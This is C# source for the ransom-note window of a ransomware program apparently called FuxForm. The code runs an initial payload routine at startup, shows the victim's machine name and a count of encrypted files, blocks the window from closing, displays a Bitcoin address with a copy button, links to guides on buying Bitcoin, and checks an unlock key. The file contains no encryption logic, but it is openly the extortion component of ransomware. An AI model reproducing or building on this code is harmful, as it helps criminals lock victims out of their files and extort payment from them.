using FuxForm.Algorithms;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace FuxForm
{
    public partial class Form1 : Form
    {
        private Timer timer;
        private TimeSpan elapsedTime;

        public Form1()
        {
            UnicallyFunctions.Unicorn(); // First execute-functions
            InitializeComponent(); // Init Form
            InitializeTimer(); // Init Timer

            SetStartupTime(); // Put datatime first executed ransomware
            UnicallyId(); // Put unically ID
            EncryptedFiles_Count(); // Displaying the amount of encrypted data
        }



        // Setting for Form
        private void Unlock_Click(object sender, EventArgs e) // Unlock-Button
        {
            if (UserPassword.Text == config.UnlockKey)
            {
                DeleteFuncs.DeleteAll();
            }

            else
            {
                MessageBox.Show("This is not correct key!", "~ Error: Wrong Key ~", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }
        }


        private void SetStartupTime()
        {
            RansStartTime.Text = AuxiliaryFunctions.GetStartupTime();
        }

        private void InitializeTimer()
        {
            timer = new Timer();
            timer.Interval = 1000; // (1000ms = 1second)
            timer.Tick += timer1_Tick;
            timer.Start();
        }

        private void TimeAfter_Execution()
        {
            SecondomersLabel.Text = elapsedTime.ToString(@"hh\:mm\:ss");
        }


        private void timer1_Tick(object sender, EventArgs e)
        {
            elapsedTime = elapsedTime.Add(TimeSpan.FromSeconds(1));
            TimeAfter_Execution();
        }

        private  void UnicallyId()
        {
            MachineID.Text += Environment.MachineName;
        }        
        
        
        private  void EncryptedFiles_Count()
        {
            label10.Text += $"{AuxiliaryFunctions.EncFiles_Count()} file(s)";
        }


        private void Form1_FormClosing(object sender, FormClosingEventArgs e) 
        {
            e.Cancel = true;
        }

        private void CopyToClipboard_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(BitcoinAddress.Text);
        }

        private void AboutBitcoin_Click(object sender, EventArgs e)
        {
            try { Process.Start("https://bitcoin.org/about"); } catch { }
        }

        private void HowBuy_Bitcoin_Click(object sender, EventArgs e)
        {
            try { Process.Start("https://www.nerdwallet.com/article/investing/how-to-invest-in-bitcoin"); } catch { }
        }

        private void ContactLabel_Click(object sender, EventArgs e)
        {
/*            Process.Start("http://link_to_contact");*/
        }
    }
}
